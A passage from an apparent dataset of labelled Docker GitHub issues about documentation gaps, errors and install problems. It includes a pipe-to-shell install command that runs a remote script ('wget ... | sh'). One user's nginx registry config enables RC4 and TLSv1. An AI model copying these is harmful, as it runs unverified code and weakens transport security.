hkp://p80.pool.sks-keyservers.net:80 --recv-keys 36A1D7869245C8950F966E92D8576A8BA88D21E9\necho \"deb https://get.docker.com/ubuntu docker main\" >> /etc/apt/sources.list\napt-get update\napt-get install lxc-docker\n```\n"},{"labels":["documentation",null],"text":"http://docs.docker.com/project/get-help/ recommends using webchat and has a little procedure to get people started.  IRCloud has a free account and better usability. We should switch it out.\n"},{"labels":["documentation"],"text":"The `--cgroup-parent` option was proposed in https://github.com/docker/docker/issues/8551, and implemented in https://github.com/docker/docker/pull/11428 and (for `docker build`) in https://github.com/docker/docker/pull/11844\n\nThe documentation for this feature is currently very limited, and even _missing_ in some places (for example, in the `docker run` [command line reference](https://github.com/docker/docker/blob/8bd5a95e1e39541dfc5dc635c5c8e7604fe10028/docs/sources/reference/commandline/cli.md#run)). In addition, there's no example on how to use this feature, which might help users understand on how to use this.\n\nObviously, care should be taken to not to explain cgroups in itself, but I found a nice short walk-through here; http://linuxaria.com/article/introduction-to-cgroups-the-linux-conrol-group)\n"},{"labels":["documentation"],"text":"I was going to install the latest docker via \n\n`wget -qO- https://get.docker.com/ | sh`\n\nHowever, uninstalling after doing so is not documented.\n1. It should be. \n2. I should be able to find it in the docs by searching for 'uninstall'.\n3. The documentation ought to say that the solution is \"run the command `sudo docker uninstall`\" or something along those lines.\n"},{"labels":["documentation",null],"text":"The main docker manpage, `man docker`, makes it look like you can do things like `docker-ps` instead of `docker ps`, which is unintentionally misleading.\n\nGiven these parts of the manpage:\n\n> **COMMANDS**\n> &nbsp;&nbsp;&nbsp;&nbsp;**docker-attach(1)**\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attach to a running container\n\nThis formatting _suggests_ that I might want to run `docker-attach` as opposed to `docker attach`. This doesn't work of course, but it might be more clear to specifically refer to `attach` as the command, and point out that full documentation for attach is found in the `docker-attach(1)` manpage.\n\n> **COMMANDS**\n> &nbsp;&nbsp;&nbsp;&nbsp;**attach**\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attach to a running container.\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;See **docker-attach(1)** for full documentation on the **attach** command.\n"},{"labels":["documentation",null],"text":"The `nproc` setting for `--ulimit` seems to be a special case in that it is limited per user (and per process). As such if you start up multiple containers using the same uid, they are limited by the same `nproc` value, for example:\n\n```\ndocker run -d -u daemon --ulimit nproc=3 busybox top\ndocker run -d -u daemon --ulimit nproc=3 busybox top\ndocker run -d -u daemon --ulimit nproc=3 busybox top\ndocker run -d -u daemon --ulimit nproc=3 busybox top\n```\n\nThe last `docker run` will fail since each container is using the same uid, and nproc for that user has been limited to 3... this is, unfortunately, how the system handles `nproc`\n\nSome extra docs explaining this would be extremely helpful.\n"},{"labels":["documentation"],"text":"https://github.com/docker/docker/blob/master/docs/sources/articles/security.md\n\nShould mention --read-only on container here.\n"},{"labels":["documentation",null],"text":"hey there, I'm totally new to Docker but I've heard so much about it that I figured I'd give it a shot.\n\nI checked this out on the website: https://www.docker.com/tryit/\n\nI must say, I have a lot of questions after going through this tutorial. Before I move on and find answers to all my questions, I thought I'd leave them here to improve the tutorial.\n\n---\n\nThere seems to be some concept of an image and a container which are different things, but I have no idea what the difference is so I'm just going to call everything a container.\n\nWe download `learn/tutorial`. We run an echo command through it. Then we install ping though it. My understanding is that ping was installed in the `learn/tutorial` container. But then what's the difference between `docker ps` and `docker ps -l`? We then commit this \"change\" to learn/ping -- I'm assuming this is analogous to creating a new branch from learn/tutorial. I could have just as easily committed back to learn/tutorial?\n\n---\n\nAnyways, I hope those questions make sense. I think it would help to give some git analogies in there. No need to answer all the questions -- I can figure  it out. I just figured getting these questions out could improve the \"try it\" experience.\n"},{"labels":["documentation",null],"text":"http://docs.docker.com/reference/commandline/cli/#default-ulimits\n\ninheritted > inherited\n"},{"labels":["documentation"],"text":"http://docs.docker.com/userguide/dockerimages\n"},{"labels":["documentation",null],"text":"The [Debian install documentation for jessie](https://docs.docker.com/installation/debian/#debian-jessie-80-64-bit) states that there is a Debian package for jessie, while [it has been removed since March 31st](https://tracker.debian.org/pkg/docker.io). Please update the docs.\n"},{"labels":["documentation",null],"text":"The last `git push` at the bottom of https://docs.docker.com/project/work-issue/#pull-and-rebase-frequently will fail, I think, unless it has `-f` added.\n\nThis is because the tip of the current branch will not match the remote repository, so Git will reject the update.\n"},{"labels":["documentation"],"text":"I created and linked to containers.  When I try to remove a link  as per the example here:\n\nhttps://docs.docker.com/reference/commandline/cli/#rm\n\nThe example doesn't work. The example shows a leading slash but this appears to be problematic.  Including the leading slash causes the command to return with and apparently remove the link. But it doesn't.\n\n```\n$ docker ps\nCONTAINER ID        IMAGE                      COMMAND                CREATED             STATUS              PORTS                     NAMES\n8e9c5dd470b7        training/webapp:latest     \"python app.py\"        2 minutes ago       Up 2 minutes        0.0.0.0:49159->5000/tcp   web                 \n5551a83d8f32        training/postgres:latest   \"su postgres -c '/us   2 minutes ago       Up 2 minutes        5432/tcp                  db                  \n\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker ps\nCONTAINER ID        IMAGE                      COMMAND                CREATED             STATUS              PORTS                     NAMES\n8e9c5dd470b7        training/webapp:latest     \"python app.py\"        3 minutes ago       Up 3 minutes        0.0.0.0:49159->5000/tcp   web                 \n5551a83d8f32        training/postgres:latest   \"su postgres -c '/us   3 minutes ago       Up 3 minutes        5432/tcp                  db                  \n\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker inspect -f \"{{ .HostConfig.Links }}\" web\n[/db:/web/db]\n\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker rm --link /web/db\n/web/db\n\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker inspect -f \"{{ .HostConfig.Links }}\" web\n[/db:/web/db]\n\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker ps\nCONTAINER ID        IMAGE                      COMMAND                CREATED             STATUS              PORTS                     NAMES\n8e9c5dd470b7        training/webapp:latest     \"python app.py\"        4 minutes ago       Up 4 minutes        0.0.0.0:49159->5000/tcp   web                 \n5551a83d8f32        training/postgres:latest   \"su postgres -c '/us   4 minutes ago       Up 4 minutes        5432/tcp                  db      \n```\n\nSpecifying a totally bogus link appears to work:\n\n```\n$ docker rm --link /web/df\n/web/df\n```\n\nBut of course the link didn't exist:\n\nHere is the only command that works:\n\n```\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker rm --link web/db\nweb/db\n\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker inspect -f \"{{ .HostConfig.Links }}\" web\n<no value>\n```\n\nHere is how I think it should work:\n- If a user specified a link that doesn't exist, we should tell them\n- If a user specifies the leading slash or not, we should remove the link -- the alternative is to return an error if the leading slash is include (or fix this command)\n"},{"labels":[null,"documentation"],"text":"I am using docker via boot2docker on my mac. Recently I've decided to setup private docker repository for my images. I've found [great article](https://github.com/MarvAmBass/docker-nginx-registry-proxy) how to setup docker registry behind nginx proxy with basic auth and ssl security. When I try to do a push I experienced strange issue:\n\n```\nMacBook-Pro-Pavel:cron vintik$ docker push registry.sashi.me/sashime-cron\nThe push refers to a repository [registry.sashi.me/sashime-cron] (len: 1)\nSending image list\n2015/04/10 23:53:23\n```\n\nAnd nothing happened.\nThen I tried to check connection with a curl call to my registry and got this:\n\n```\ndocker@boot2docker:~$ curl -k -v https://registry.sashi.me/v1/_ping\n* About to connect() to registry.sashi.me port 443 (#0)\n*   Trying 148.251.11.50...\n* Adding handle: conn: 0x9ffdad8\n* Adding handle: send: 0\n* Adding handle: recv: 0\n* Curl_addHandleToPipeline: length: 1\n* - Conn 0 (0x9ffdad8) send_pipe: 1, recv_pipe: 0\n* Connected to registry.sashi.me (148.251.11.50) port 443 (#0)\n* successfully set certificate verify locations:\n*   CAfile: none\n  CApath: /usr/local/etc/ssl/certs\n* SSLv3, TLS handshake, Client hello (1):\n* SSLv3, TLS handshake, Server hello (2):\n* SSLv3, TLS handshake, CERT (11):\n* SSLv3, TLS handshake, Server key exchange (12):\n* SSLv3, TLS handshake, Server finished (14):\n* SSLv3, TLS handshake, Client key exchange (16):\n* SSLv3, TLS change cipher, Client hello (1):\n* SSLv3, TLS handshake, Finished (20):\n* SSLv3, TLS change cipher, Client hello (1):\n* SSLv3, TLS handshake, Finished (20):\n* SSL connection using ECDHE-RSA-AES256-SHA\n* Server certificate:\n*    subject: C=RU; ST=Moscow Region; L=Moscow; O=Sashime; CN=registry.sashi.me\n*    start date: 2015-04-10 18:38:43 GMT\n*    expire date: 2025-04-07 18:38:43 GMT\n*    issuer: C=RU; ST=Moscow Region; L=Moscow; O=Sashime; CN=registry.sashi.me\n*    SSL certificate verify result: self signed certificate (18), continuing anyway.\n> GET /v1/_ping HTTP/1.1\n> User-Agent: curl/7.33.0\n> Host: registry.sashi.me\n> Accept: */*\n> \n* Empty reply from server\n* Connection #0 to host registry.sashi.me left intact\ncurl: (52) Empty reply from server\n```\n\nThen I make a try directly from my mac:\n\n```\nMacBook-Pro-Pavel:files vintik$ curl -k -v https://registry.sashi.me/v1/_ping\n* Hostname was NOT found in DNS cache\n*   Trying 148.251.11.50...\n* Connected to registry.sashi.me (148.251.11.50) port 443 (#0)\n* TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384\n* Server certificate: torl.org\n* Server certificate: COMODO RSA Domain Validation Secure Server CA\n* Server certificate: COMODO RSA Certification Authority\n* Server certificate: AddTrust External CA Root\n> GET /v1/_ping HTTP/1.1\n> User-Agent: curl/7.37.1\n> Host: registry.sashi.me\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n* Server nginx/1.4.1 (Ubuntu) is not blacklisted\n< Server: nginx/1.4.1 (Ubuntu)\n< Date: Sat, 11 Apr 2015 07:59:22 GMT\n< Content-Type: application/json\n< Content-Length: 1521\n< Connection: keep-alive\n< X-Docker-Registry-Config: dev\n< Expires: -1\n< X-Docker-Registry-Standalone: True\n< Pragma: no-cache\n< Cache-Control: no-cache\n< Strict-Transport-Security: max-age=31536000; includeSubdomains\n< \n* Connection #0 to host registry.sashi.me left intact\n{\"host\": [\"Linux\", \"bf6ccd9bf43c\", \"3.18.6\", \"#2 SMP Sat Feb 28 02:23:04 UTC 2015\", \"x86_64\", \"x86_64\"], \"launch\": [\"/usr/local/bin/gunicorn\", \"--access-logfile\", \"-\", \"--error-logfile\", \"-\", \"--max-requests\", \"100\", \"-k\", \"gevent\", \"--graceful-timeout\", \"3600\", \"-t\", \"3600\", \"-w\", \"4\", \"-b\", \"0.0.0.0:5000\", \"--reload\", \"docker_registry.wsgi:application\"], \"versions\": {\"M2Crypto.m2xmlrpclib\": \"0.22\", \"SocketServer\": \"0.4\", \"argparse\": \"1.1\", \"backports.lzma\": \"0.0.3\", \"blinker\": \"1.3\", \"cPickle\": \"1.71\", \"cgi\": \"2.6\", \"ctypes\": \"1.1.0\", \"decimal\": \"1.70\", \"distutils\": \"2.7.6\", \"docker_registry.app\": \"0.9.1\", \"docker_registry.core\": \"2.0.3\", \"docker_registry.server\": \"0.9.1\", \"email\": \"4.0.3\", \"flask\": \"0.10.1\", \"gevent\": \"1.0.1\", \"greenlet\": \"0.4.5\", \"gunicorn\": \"19.1.1\", \"gunicorn.arbiter\": \"19.1.1\", \"gunicorn.config\": \"19.1.1\", \"gunicorn.six\": \"1.2.0\", \"jinja2\": \"2.7.3\", \"json\": \"2.0.9\", \"logging\": \"0.5.1.2\", \"parser\": \"0.5\", \"pickle\": \"$Revision: 72223 $\", \"platform\": \"1.0.7\", \"pyexpat\": \"2.7.6\", \"python\": \"2.7.6 (default, Mar 22 2014, 22:59:56) \\n[GCC 4.8.2]\", \"re\": \"2.2.1\", \"redis\": \"2.10.3\", \"requests\": \"2.3.0\", \"requests.packages.chardet\": \"2.2.1\", \"requests.packages.urllib3\": \"dev\", \"requests.packages.urllib3.packages.six\": \"1.2.0\", \"requests.utils\": \"2.3.0\", \"simplejson\": \"3.6.2\", \"sqlalchemy\": \"0.9.4\", \"tarfile\": \"$Revision: 85213 $\", \"urllib\": \"1.17\", \"urllib2\": \"2.7\", \"werkzeug\": \"0.10.4\", \"xml.parsers.expat\": \"$Revision: 17\n```\n\nAnd it returns expected result!\nSo I've figured out that boot2docker and my mac works with ssl quite different. So finally I've made some work with my nginx config and here it is:\n\n```\n# For versions of Nginx > 1.3.9 that include chunked transfer encoding support\n# Replace with appropriate values where necessary\n\nupstream docker-registry {\n  server {{ ip }}:5000;\n}\nserver {\n  listen 80;\n  server_name {{ inventory_hostname }};\n  proxy_set_header Host       $http_host;   # required for Docker client sake\n  proxy_set_header X-Real-IP  $remote_addr; # pass on real client IP\n  proxy_set_header Authorization  \"\"; # see https://github.com/dotcloud/docker-registry/issues/170\n  proxy_read_timeout               900;\n  location / {\n    return 301 https://{{ inventory_hostname }}$request_uri;\n  }\n  location /_ping {\n    auth_basic off;\n    proxy_pass                       http://docker-registry;\n  }\n  location /v1/_ping {\n    auth_basic off;\n    proxy_pass                       http://docker-registry;\n  }\n}\n\nserver {\n  listen 443;\n  server_name {{ inventory_hostname }};\n\n  ssl on;\n  ssl_certificate /etc/ssl/cert.pem;\n  ssl_certificate_key /etc/ssl/key.pem;\n# fix issue with boot2docker ssl\n  ssl_session_cache   shared:SSL:10m;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_prefer_server_ciphers on;\n  ssl_ciphers \"EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS +RC4 RC4\";\n\n  # set HSTS-Header because we only allow https traffic\n  add_header Strict-Transport-Security \"max-age=31536000; includeSubdomains\";\n\n  proxy_set_header Host       $http_host;   # required for Docker client sake\n  proxy_set_header X-Real-IP  $remote_addr; # pass on real client IP\n  proxy_set_header Authorization  \"\"; # see https://github.com/dotcloud/docker-registry/issues/170\n  proxy_read_timeout               900;\n\n  client_max_body_size 0; # disable any limits to avoid HTTP 413 for large image uploads\n\n  # required to avoid HTTP 411: see Issue #1486 (https://github.com/dotcloud/docker/issues/1486)\n  chunked_transfer_encoding on;\n\n  location / {\n    # let Nginx know about our auth file\n    auth_basic              \"Restricted\";\n    auth_basic_user_file    /etc/pass.htpasswd;\n    proxy_pass                       http://docker-registry;\n  }\n  location /_ping {\n    auth_basic off;\n    proxy_pass                       http://docker-registry;\n  }\n  location /v1/_ping {\n    auth_basic off;\n    proxy_pass                       http://docker-registry;\n  }\n}\n```\n\nSo the main fix is to add this strings:\n\n```\n  ssl_session_cache   shared:SSL:10m;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_prefer_server_ciphers on;\n  ssl_ciphers \"EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS +RC4 RC4\";\n```\n\nI don't know which one of this really helps, I simply grub them from one of my nginx configs.\nI believe it should help somebody! Good luck!\n"},{"labels":["documentation"],"text":"The api doc for the [`Binds` argument](https://docs.docker.com/reference/api/docker_remote_api_v1.17/#create-a-container) is incorrect.  When creating a new volume, the volume should not appear in \"Binds\".  The [implementation](https://github.com/docker/docker/blob/master/daemon/volumes.go#L225) explicity checks for a string with two or three components separated by \":\".\n\nMoreover, the resulting error message is \"Invalid volume specification\", which is confusing, as it doesn't mention the `Binds` argument at all.\n"},{"labels":["documentation",null],"text":"the docs that end up here --> http://docs.docker.com/reference/commandline/cli/#daemon\n\nsince the commit 29d01b7, now the examples for running the daemon have a PS1 command prompt of `$` which indicates a non-privileged user. Though correctly marking the command prompt with `#` which indicates root user, would make them appear as comments. \n\nWe should find a markdown way to show the prompt for a `#` PS1 to be normal, or add back `sudo` for the `docker -d` type examples.\n\n/cc @moxiegirl @thaJeztah @SvenDowideit \n"},{"labels":["documentation",null],"text":"This is minor and probably won't be caught for some time but... \nSee code command snippet\n\n```\nvagrant@ubuntu-1:~$ docker -v\nDocker version 1.6.0-rc4, build e2e39fc\nvagrant@ubuntu-1:~$ cid=$(docker run -itd --ulimit data=8192 ubuntu)\nvagrant@ubuntu-1:~$ docker logs $cid\nbash: xmalloc: .././locale.c:81: cannot allocate 2 bytes (0 bytes allocated)\n```\n"},{"labels":["documentation",null],"text":"All the [Installation docs](https://docs.docker.com/installation/) cover how to install docker in detail, but none of them talk about configuring the docker daemon after the installation.\n\nThere should be a short section in there describing the config process. For example, in Ubuntu, the daemon can be configured by adding options in `/etc/default/docker` and in CentOS/RHEL, the daemon can be configured by editing `/etc/sysconfig/docker`\n\nThere is [one article](https://docs.docker.com/articles/systemd/) which covers this, but it is very specific. It would be nice to have a short config article after every installation step for various Operating Systems\n"},{"labels":["documentation"],"text":"I'm gong to pick this up after the release...also...I'm not sure how this fits with the recent commentary coming in on Joyent installation.\n"},{"labels":["documentation"],"text":"In the last example of [userguide/dockervolumes](http://docs.docker.com/userguide/dockervolumes/) we want to restore backed up data into a `dbdata2` container:\n\n```\nsudo docker run -v /dbdata --name dbdata2 ubuntu /bin/bash\nsudo docker run --volumes-from dbdata2 -v $(pwd):/backup busybox tar xvf /backup/backup.tar\n```\n\nThis snippet has 2 issues:\n1. If we dig into the logic of the snippet, we'll see that restored data should get into `/dbdata` directory of `dbdata2` container. Instead the data is left in `/` directory of a temporary container. The second line should like this:\n   \n   ```\n   sudo docker run --volumes-from dbdata2 -v $(pwd):/backup busybox cd /dbdata && tar xvf /backup/backup.tar\n   ```\n   \n   (Added `cd /dbdata &&`)\n2. As it was previously stated in the userguide, we'd like to use the same base containers for most operations to reduce network and disk usage. So that in the second line `busybox` should be replaced by `ubuntu`. Though considering the size of busybox this may be not a very serious issue :smile:.\n"},{"labels":["documentation"],"text":"For the reasons discussed at #3793, the signal will be passed to the container but in many cases it won't actually terminate because it is running as PID 1.\n\nI could not find any mention of this in any of the documentation for `-sig-proxy`, `docker kill`, etc., which is where I looked to try to understand why it wasn't working for me.\n\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1189865 has a nice example to experiment with.\n"},{"labels":["documentation"],"text":"I was following this page: https://docs.docker.com/installation/ubuntulinux/\n\nAfter I installed docker but and ran the command: $ sudo docker run hello-world\n\nIt returned:\n\nFATA[0000] Get http:///var/run/docker.sock/v1.17/version: dial unix /var/run/docker.sock: no such file or directory. Are you trying to connect to a TLS-enabled daemon without TLS?\n\ncan you please add a step in the instructions to run: service docker restart\n\nThis fixed the issue for me.\n"},{"labels":["documentation",null],"text":"On https://docs.docker.com/installation/rhel/ it's mentioned that you can use the command:\n\n```\n$ sudo subscription-manager repos --enable=rhel-7-server-extras-rpms\n```\n\nhowever, this doesn't work by default on RHEL 7 EC2 instances.  Instead, you need to modify the file:\n\n```\n/etc/yum.repos.d/redhat-rhui.repo\n```\n\nand modify the \"[rhui-REGION-rhel-server-extras]\" section to include \"enabled=1\".\n"},{"labels":["documentation",null],"text":"Or docker/docs/README.md should include information for how to get the Man pages in Mac OSX.\n\nhttp://stackoverflow.com/questions/26368263/how-to-install-docker-man-pages-on-mac-os\n"},{"labels":["documentation"],"text":"Fixing typos, grammar, concise wording, etc. \n"},{"labels":["documentation",null],"text":"On the [Work with a development container](http://docs.docker.com/project/set-up-dev-env/) page (from the Contributor Guide), the output from running `hack/make.sh binary` needs to be updated to reference `binary` instead of `ubuntu`. \n\nCurrently, the output is:\n\n```\n---> Making bundle: ubuntu (in bundles/1.5.0-dev/ubuntu)\nCreated package {:path=>\"lxc-docker-1.5.0-dev_1.5.0~dev~git20150223.181106.0.1ab0d23_amd64.deb\"}\nCreated package {:path=>\"lxc-docker_1.5.0~dev~git20150223.181106.0.1ab0d23_amd64.deb\"}\n```\n\nRather, it should be something akin to:\n\n```\n---> Making bundle: binary (in bundles/1.5.0-dev/binary)\nCreated binary: /go/src/github.com/docker/docker/bundles/1.5.0-dev/binary/docker-1.5.0-dev\n```\n"},{"labels":["documentation",null],"text":"\"Configure Git for contributing\" section does not mention where to configure git in Windows. \n"},{"labels":["documentation",null],"text":"Support for setting ulimits for containers was added with #9437, but has a couple of quirks (like `as` ulimit not being supported) and could use some extra docs love.\n"},{"labels":["documentation"],"text":"Currently the documentation notes that \"_In addition to `--privileged`, the operator can have fine grain control over the capabilities using `--cap-add` and `--cap-drop`. By default, Docker has a default list of capabilities that are kept._\" (ref: https://github.com/docker/docker/blame/master/docs/sources/reference/run.md#L632-L636)\n\nHowever, at that point a few examples are given, but no information is provided on what that list of capabilities are, making it hard for users to search/find what those capabilities and, specifically, their names, are.\n\nThe current capabilities list in Docker is here: https://github.com/docker/docker/blob/master/daemon/execdriver/utils.go\n\nThey can be mapped to these additional descriptions here: http://linux.die.net/man/7/capabilities\n\nPotentially a table might be a nice way to list this information if we agree that's how we want to display, or if we want an external pointer that may be reasonable as well.  The docs team may have guidance here (ping @SvenDowideit @moxiegirl @fredlf @jamtur01)\n"},{"labels":["documentation",null],"text":"Hello,\nI've been struggling with this on ubuntu 14.10, docker 1.5.0. More than should be the case.\n\nMy problems came from the following:\n- Assuming that the ulimit is set the same inside a container than on the host. (it isn't). But also, that the output of the ulimit command was a bit misleading because:\n\n``` sh\n$ ulimit\nunlimited\n```\n\nis not the same thing as \n\n``` sh\n$ ulimit -c\n0\n```\n\nIn the container, base image was `ubuntu-debootstrap:14.04`.\n- On ubuntu the default setting - core files get piped to `apport` program. This is no good in containers. It must be overridden to something else if `apport` is not installed inside the container.\n\nIt would also be a help if linux kernel could have a different value of `/proc/sys/kern/pattern` inside the container than outside it. Since in the 2 environments they may need to point to different locations. I'm not sure that is something that Docker can do anything about but might be worth to think about.\n- It is not clear, as core dumps are a kernel managed thing, whether resulting core files are written by kernel to the host filesystem or the container filesystem. This should also be clearly documented. They are written inside the container.\n- Open question: How best to save the core files as when the container exits the filesystem is not remembered. I think docker could give a clear instruction here too - e.g. how or what to mount where to write the core files to.\n\nMany thanks for any consideration. Else it will have to be answered on stack overflow.\n"},{"labels":["documentation",null],"text":"Dockerfile appears broken and outdated. Running \"wget -qO- http://cfengine.com/pub/gpg.key | apt-key add - \" returns a 403. \n\nhttps://github.com/docker/docker/blob/b64558907139911b86d846de70ab859504cc45a2/docs/sources/articles/cfengine_process_management.md\n\nLink to article with error: https://docs.docker.com/engine/articles/cfengine_process_management/\n"},{"labels":["documentation",null],"text":"References to editing the `DOCKER_OPTS` in the `/etc/default/docker` file seem to be sprinkled throughout the documentation, but never explicitly stated or explained. Also everywhere it is referenced it specifies Ubuntu, but I believe it is also true for CentOS.\n"},{"labels":["documentation",null,null],"text":"**Problem**\n\nThere are no clear documentation on what it takes to create an official image.\n\n**Solution**\n\nDocument the steps to create and submit a new official image to the correct repositories.  @tianon can be a source for information on what needs to happen and what is expected.\n"},{"labels":["documentation",null,null],"text":"**Problem**\n\nDocker lacks documentation on what the defaults mounts that are added for network files.\n\n**Solution**\n\nDocument the docker provided mounts for things like `/etc/hosts`, `/etc/hostname`, and `/etc/resolv.conf` that docker automatically sets up and bind mounts into containers as read-write as the default container profile.\n"},{"labels":["documentation"],"text":"**Problem**\n\nDocument `DockerCli` methods or make them private function in `api/client/cli.go`.\n\n**Solution**\n\nMake methods not used outside package private, document remained public methods in godoc-style.\n"},{"labels":["documentation"],"text":"**Problem**\n\nDocument DockerCli `Cmd...` method\n\n**Solution**\n\nWrite godoc-style docstrings for each `Cmd...` method(which cli command it represents, maybe something about parameters) in `api/client/commands.go`.\n"},{"labels":["documentation"],"text":"**Problem**\n\nDocument `DockerCli` struct and `NewDockerCli` function in `api/client/cli.go`.\n\n**Solution**\n\nWrite godoc-style comments which describe idea of DockerCli(each Cmd... method represents cli command) and NewDockerCli parameters. Examples of such comments can be found in golang standard library golang.org/pkg/.\n"},{"labels":["documentation",null],"text":"**Problem**\n\nDocument `builtins.Register`\n\n**Solution**\n\nWrite godoc-style docstring form Register function in `builtins/builtins.go`.\n"},{"labels":["documentation",null,null],"text":"**Problem**\n\nDocument public functions and method in builder\n\n**Solution**\n\nOr make them private. Probably builder public things is not used by other packages.\n"},{"labels":["documentation",null],"text":"**Problem**\n\nDocument constants in api/common.go\n\n**Solution**\n\nShort explanation why we need them here(used both by daemon and client) and short inline comment for each. Example: http://golang.org/src/math/const.go#L8\n"},{"labels":["documentation",null,null],"text":"**Problem**\n\npkg/system - Document exported functions and types\n\n**Solution**\n\nThe `pkg/system` package is used for portable low level functions throughout Docker code. It is meant to be reused by other applications, however it lacks documentation.\n\nAdd a README.md to the package, and code comments to the package's exported symbols.\n"},{"labels":["documentation",null],"text":"**Problem**\n\nDocument running Docker on RaspberryPI\n\n**Solution**\n\nMany blogs are out there, some of which are quite old, that talk about ways to get Docker running on a RaspberryPI.  We should put together better documentation in a central place on how to run Docker on various common OS distros used on RaspberryPI (raspbian, snappy ubuntu, etc.)\n"},{"labels":["documentation",null],"text":"**Problem**\n\npkg/truncindex - Documentation\n\n**Solution**\n\nAll things in the `pkg/` subdirectories are meant to be general purpose packages to be reused outside of Docker. The `truncindex` package provides a general 'index tree', used by Docker in order to be able to reference containers by only a few unambiguous characters of their id.\n\nHowever, to be easily reused by another application, this package needs documentation. Add a README.md file in `pkg/truncindex/` explaining the purpose of the package, and comment exported functions and types to make it easy to use.\n"},{"labels":["documentation",null,null],"text":"The hello world page in the user guide would strongly benefit from a few screenshots and other graphics to help the users.\n\nhttp://docs.docker.com/userguide/dockerizing/\n"},{"labels":["documentation",null],"text":"On the page https://docs.docker.com/reference/commandline/cli/#rm, in the RM command reference the following paragraph seems to be missing the command example\n\n\"This command will delete all stopped containers. The command docker ps -a -q will return all existing container IDs and pass them to the rm command which will delete them. Any running containers will not be deleted.\"\n\n@moxiegirl \n"},{"labels":["documentation",null],"text":"Add information for getting around key errors when installing Docker on Ubuntu and Debian \n-->\nIf your company is behind a filtering proxy, you may find the `apt-key` command fails for the Docker repo during installation. To work around this, add the key directly using the following:\n\n`wget -qO- https://get.docker.com/gpg  | sudo apt-key add -`\n"},{"labels":["documentation"],"text":"Hi guys,\r\n\r\n```\r\ne@e#24: docker pull --help\r\n\r\nUsage: docker pull [OPTIONS] NAME[:TAG]\r\n\r\nPull an image or a repository from the registry\r\n\r\n  -a, --all-tags=false    Download all tagged images in the repository\r\n  --help=false            Print usage\r\ne@e#24\r\n```\r\n\r\nAs is well-known, there isn't just \"the registry\". Therefore, the help text should be updated to explain how to specify the registry as well. Maybe something like:\r\n\r\n```\r\nUsage: docker pull [OPTIONS] [REGISTRY_HOST[:REGISTRY_PORT]/]NAME[:TAG]\r\n\r\nPull an image or a repository from the given registry (or the default docker registry if none specified).\r\n\r\n  -a, --all-tags=false    Download all tagged images in the repository\r\n  --help=false            Print usage\r\n```\r\n"},{"labels":["documentation",null,null],"text":"**Summary**: There is no documentation on \"how to\" migrate containers/images to another host\n**Proposed solution**: write an article that describes how containers, images and their volumes can be migrated to a new/other host. The article should contain practical examples and limitations of the process. Possible alternatives/best practices can be considered to be included in the article.\n\n---\n\nThis came up in another issue (see https://github.com/docker/docker/issues/10702#issuecomment-76508564); how can image, containers (and their volumes) be migrated to another host.\n"},{"labels":["documentation"],"text":"We need docs to explain the by design behavior changed at #11148. Feel free to assign to me, although I'm not sure where to document this. Maybe ADD/COPY instructions in Dockerfile documentation would be nice. @tiborvass \n"},{"labels":["documentation",null],"text":"I encountered an obscure error a few days ago and I felt compelled to publish it where it might help some people.\n\nHere is the story.\n\nFor a while I've been facing permissions errors from within containers trying to access certain files and I couldn't work out why this was happening. It only affected files when mounting them to the container, not when added to the container. Further more, when executing a shell inside the container, the files existed and the user could write to the mounted directory.\n\nThis bugged me for weeks and I'd reverted to rebuilding the containers whenever I made a change. Strangely, when a friend of mine pulled the code from git and mounted the volume... it worked. I concluded this was an error on my personal machine.. However when he pushed new code it miraculously worked on my machine... \n\nAfter some inspection I noticed that the file downloaded with safari contained an extended attribute 'com.apple.quarentine'. Removing this made everything work again. And because git strips extended attributes before committing this is why 'git files' worked.\n\nIt turns out, when downloading files with Safari on OS X, OS X adds an attribute to refuse access to the file until it has been opened. Now this was causing OS X to refuse access when boot2docker wanted to access the files. SILENTLY. Yay. \n\nSo if a warning could be given when mounting 'quarentined' files, it would be fantastic... And perhaps save others the wasted time figuring this out. \n\nCool.\n"},{"labels":["documentation",null,null],"text":"From a user via docs feedback.\n\n\"How much disk space containers will take up. The registry doesn't appear to\nhave any indication and AFAICT one would need to visit several places to\nget an estimate. Maybe I have missed some crucial point? I understand\nhow containers could be \"lightweight\" if a one was intended to be hosted\non the same OS/version I have on my desktop but if not then potentially\nI'm looking a several gigs of download yes?\"\n\nhttps://docs.docker.com/userguide/dockerimages/ Has information  --- is the closests but this user was more about \"predicting\" the size prior to download.\n"},{"labels":["documentation",null,null],"text":"The documentation at https://docs.docker.com obviously lacks any discussion of the available storage-drivers which imo is essential to guide people to their docker-setup.\n\nOne lesson, i learned today, is that you cannot run containers with the btrfs-driver if the `/var/lib/docker`-path itself is a subvolume of a btrfs-tree. This directory must sit in the `default`-volume of a btrfs-volume.\nAnd i think this should be covered in the documentation.\n"},{"labels":["documentation",null],"text":"Please change the EPEL link on RHEL 6.5+ installation documentation from https to http because https doesn’t work anymore. Thanks a 